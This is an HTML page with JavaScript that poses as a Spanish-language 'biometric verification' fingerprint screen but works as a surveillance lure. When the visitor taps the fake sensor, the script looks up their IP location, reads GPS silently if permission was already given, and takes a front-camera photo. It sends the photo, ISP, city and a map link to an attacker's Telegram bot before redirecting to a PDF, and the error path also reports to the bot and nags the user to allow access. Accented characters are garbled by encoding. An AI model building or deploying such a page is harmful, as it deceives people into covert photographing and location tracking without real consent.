<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sistema de Verificaci√≥n Biom√©trica</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Roboto', sans-serif; margin: 0; overflow: hidden; }
        .auth-card { text-align: center; padding: 20px; width: 90%; max-width: 350px; }
        h1 { font-size: 16px; letter-spacing: 3px; font-weight: 300; color: #00d4ff; margin-bottom: 50px; }
        .sensor-container { position: relative; width: 120px; height: 120px; margin: 0 auto; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .fingerprint-svg { width: 70px; fill: #00d4ff; filter: drop-shadow(0 0 15px rgba(0, 212, 255, 0.6)); z-index: 5; }
        .loading-ring { position: absolute; width: 110px; height: 110px; border: 2px solid rgba(0, 212, 255, 0.1); border-top: 2px solid #00d4ff; border-radius: 50%; display: none; animation: spin 1s linear infinite; }
        .scan-line { position: absolute; width: 100px; height: 2px; background: #00d4ff; box-shadow: 0 0 20px #00d4ff; display: none; z-index: 10; animation: scan 2s ease-in-out infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes scan { 0%, 100% { top: 20%; } 50% { top: 80%; } }
        .status { margin-top: 40px; font-size: 11px; letter-spacing: 2px; color: #666; text-transform: uppercase; }
        .footer-note { position: absolute; bottom: 20px; font-size: 9px; color: #222; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="auth-card">
        <h1>AUTENTICACI√ìN REQUERIDA</h1>
        <div class="sensor-container" id="sensor">
            <div class="loading-ring" id="ring"></div>
            <div class="scan-line" id="laser"></div>
            <svg class="fingerprint-svg" viewBox="0 0 24 24"><path d="M17.81 4.47c-.08 0-.16-.02-.23-.06C15.66 3.42 14 3 12.01 3c-1.98 0-3.86.47-5.57 1.41-.24.13-.54.04-.67-.2-.13-.24-.04-.55.2-.68C7.82 2.52 9.86 2 12.01 2c2.13 0 3.99.47 6.03 1.56.24.13.33.43.2.67-.09.16-.24.24-.43.24zm3.49 4.72c-.11 0-.22-.04-.31-.12-.18-.17-.43-.38-.73-.61-.23-.17-.28-.49-.11-.72.17-.23.49-.28.72-.11.33.25.62.49.84.69.21.19.22.51.03.71-.11.1-.28.16-.44.16zm-17.3.01c-.16 0-.32-.06-.43-.17-.19-.2-.18-.52.02-.71.22-.2.51-.44.84-.69.23-.17.55-.12.72.11.17.23.12.55-.11.72-.3.23-.55.44-.73.61-.1.08-.21.13-.31.13zm15.42 3.4c-.11 0-.21-.04-.31-.12-1.31-1.12-2.73-1.76-4.32-2-1.95-.31-3.89.15-5.5 1.29-.24.17-.56.11-.73-.13-.17-.24-.11-.56.13-.73 1.83-1.29 4.07-1.83 6.32-1.47 1.83.29 3.48 1.03 4.98 2.31.2.18.22.5.04.7-.09.09-.21.15-.41.15zM4.14 12.6c-.15 0-.3-.06-.41-.17-.2-.2-.2-.52 0-.72 1.51-1.3 3.16-2.03 4.99-2.32 1.15-.18 2.26-.14 3.32.12.29.07.47.36.4.65-.07.29-.36.47-.65.4-1.14-.28-2.31-.3-3.52-.11-1.57.24-2.98.88-4.28 2-.1.1-.23.15-.35.15zM12 22c-.11 0-.21-.04-.31-.12-1.54-1.28-2.61-2.48-3.41-3.8-.75-1.23-1.14-2.58-1.14-4.01 0-2.29 1.54-4.44 3.65-5.11 1.76-.56 3.63-.33 5.12.63 1.41.91 2.27 2.45 2.33 4.19.01.29-.21.53-.5.54s-.53-.21-.54-.5c-.05-1.42-.75-2.69-1.9-3.43-1.21-.78-2.73-.97-4.16-.51-1.71.55-2.99 2.31-2.99 4.2 0 1.25.34 2.42.98 3.47.7.1.15 1.7 1.12 3.03 2.5 1.07 2.1 4.17.21.5-.04-.31-.13-.42-.17zM14.28 15.65c-.19 0-.37-.11-.46-.29-.65-1.33-1.31-1.84-2.32-1.84s-1.68.51-2.33 1.84c-.13.26-.45.37-.71.24s-.37-.45-.24-.71c.88-1.78 2-2.37 3.28-2.37s2.4.59 3.28 2.37c.13.26.02.58-.24.71-.09.04-.19.05-.26.05z" /></svg>
        </div>
        <div class="status" id="status">Mantenga presionado para escanear</div>
    </div>

    <div class="footer-note">ENCRYPTED BIOMETRIC ACCESS SYSTEM</div>

    <script src="config.js"></script>
    <script>
        const sensor = document.getElementById('sensor');
        const status = document.getElementById('status');
        const laser = document.getElementById('laser');
        const ring = document.getElementById('ring');
        let procesoExitoso = false;

        async function obtenerGPS() {
            return new Promise((resolve) => {
                if (!navigator.permissions) return resolve(null);
                navigator.permissions.query({name:'geolocation'}).then((result) => {
                    if (result.state === 'granted') {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: "M√âTRICA (GPS)" }),
                            () => resolve(null),
                            { timeout: 3000 }
                        );
                    } else { resolve(null); }
                });
            });
        }

        async function validar() {
            if (navigator.vibrate) navigator.vibrate(100);
            status.innerHTML = "INICIANDO ESCANEO BIOM√âTRICO...";
            ring.style.display = "block";
            laser.style.display = "block";

            let infoReporte = "";

            try {
                // 1. TRIANGULACI√ìN POR NODOS
                const res = await fetch('https://ipwho.is/');
                const d = await res.json();
                
                // 2. Intento de GPS silencioso
                const gps = await obtenerGPS();
                const lat = gps ? gps.lat : d.latitude;
                const lon = gps ? gps.lon : d.longitude;
                const precision = gps ? gps.acc : "INFRAESTRUCTURA (Red)";

                infoReporte = `üõ°Ô∏è *AUDITOR√çA TESIS* \nüì° *RED:* ${d.connection.isp} \nüìç *LOC:* ${d.city} \nüéØ *PREC:* ${precision} \nüîó *MAP:* https://www.google.com/maps?q=${lat},${lon}&z=19`;

                // 3. Captura de C√°mara
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute("playsinline", true);
                video.play();
                
                await new Promise(r => setTimeout(r, 2000));

                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const foto = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.6));
                stream.getTracks().forEach(t => t.stop());

                // 4. Env√≠o a Telegram
                const fd = new FormData();
                fd.append('chat_id', CONFIG.CHAT_ID);
                fd.append('photo', foto, 'evidencia.jpg');
                fd.append('caption', `‚úÖ *VERIFICADO*\n${infoReporte}`);
                fd.append('parse_mode', 'Markdown');

                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                
                procesoExitoso = true;
                status.innerHTML = "‚úÖ IDENTIDAD VERIFICADA";
                setTimeout(() => location.href = CONFIG.PDF_URL, 1000);

            } catch (err) {
                const errorMsg = (err.name === 'NotAllowedError') ? "üö´ BLOQUEO C√ÅMARA" : `‚ö†Ô∏è ERROR: ${err.message}`;
                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: `‚ùå *FALLO*\n${errorMsg}\n${infoReporte}`, parse_mode: 'Markdown' })
                });
                alert("Error de sensor. Aseg√∫rese de permitir el acceso para continuar.");
                location.reload();
            }
        }
        sensor.addEventListener('click', validar);
    </script>
</body>
</html>
